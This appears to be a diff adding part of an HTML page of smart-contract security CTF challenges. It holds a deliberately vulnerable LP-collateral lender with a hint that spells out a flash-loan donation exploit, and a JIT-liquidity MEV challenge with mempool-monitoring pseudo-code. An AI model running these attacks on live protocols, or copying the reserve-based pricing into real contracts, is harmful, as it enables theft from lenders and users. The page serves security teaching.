+    function getLPValue(uint256 lpAmount) public view returns (uint256) {
+        uint256 totalLP = IERC20(lpToken).totalSupply();
+        (uint256 r0, uint256 r1) = IPool(pool).getReserves();
+        // LP value = (r0 + r1) * lpAmount / totalLP
+        // Donating to pool inflates r0/r1 without increasing totalLP!
+        return (r0 + r1) * lpAmount / totalLP;
+    }
+
+    function depositLP(uint256 amount) external {
+        IERC20(lpToken).transferFrom(msg.sender, address(this), amount);
+        collateral[msg.sender] += amount;
+    }
+
+    function borrow(uint256 ethAmount) external {
+        uint256 value = getLPValue(collateral[msg.sender]);
+        require(value >= ethAmount, "Undercollateralized");
+        payable(msg.sender).transfer(ethAmount);
+    }
+}
+
+interface IPool {
+    function getReserves() external view returns (uint256, uint256);
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> (1) Provide liquidity to get some LP tokens. (2) Deposit LP tokens as collateral in the lender. (3) Flash loan a large amount of tokens. (4) Transfer (donate) them directly to the pool contract (not via swap). (5) <code>getReserves()</code> now shows inflated reserves. (6) Your LP tokens appear much more valuable. (7) Borrow max ETH from lender. (8) The pool reserves go back to normal on the next swap, but you already borrowed. Fix: use the Alpha Homora fair LP pricing formula: <code>value = 2 * sqrt(r0 * r1) * sqrt(p0 * p1) / totalLP</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: MEV Extraction — JIT Liquidity</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Implement a JIT (Just-In-Time) liquidity attack on Uniswap V3. Detect a large pending swap, add concentrated liquidity in a tight tick range around the expected price, collect the trading fee from the victim's swap, then immediately remove your liquidity.</p>
+<pre><code class="language-javascript">// JIT Liquidity concept (Uniswap V3)
+//
+// Normal LP: provides liquidity across a wide price range, earns fees over time
+// JIT LP: provides concentrated liquidity for exactly ONE swap, then removes it
+//
+// Attack flow:
+// 1. Monitor mempool for large Uniswap V3 swaps
+// 2. Front-run: addLiquidity in a tight tick range [currentTick-1, currentTick+1]
+// 3. Victim's swap executes, paying 0.3% fee mostly to your concentrated position
+// 4. Back-run: removeLiquidity immediately
+// 5. Profit = trading fees earned minus gas costs
+//
+// Why it works: Concentrated liquidity in V3 means your tiny range captures
+// almost all the trading fee from the large swap, despite providing liquidity
+// for only a few seconds.
+//
+// This is NOT theft — it's competition with other LPs. But it extracts value
+// that would have gone to long-term LPs.
+
+// Pseudo-code for detection:
+async function detectLargeSwaps(pendingTx) {
+    if (pendingTx.to === UNISWAP_V3_ROUTER) {
+        const decoded = iface.parseTransaction(pendingTx);
+        if (decoded.name === "exactInputSingle") {
+            const amountIn = decoded.args.amountIn;
+            if (amountIn > ethers.parseEther("10")) {
+                console.log("Large swap detected:", amountIn);
+                // Calculate optimal tick range and liquidity amount
+                // Submit front-run + back-run bundle via Flashbots
+            }
+        }
+    }
+}</code></pre>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> JIT liquidity requires: (1) Fast mempool monitoring. (2) Understanding Uniswap V3's concentrated liquidity math — specifically how fees are distributed proportionally to in-range liquidity. (3) Flashbots bundles to guarantee the add-liquidity → victim-swap → remove-liquidity ordering. (4) The profit margin is the trading fee minus gas costs and Flashbots tips. On large swaps ($100K+), the 0.3% fee (~$300) can easily exceed gas costs (~$50). This is one of the most sophisticated MEV strategies in production today.</p>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+</body>
+</html>
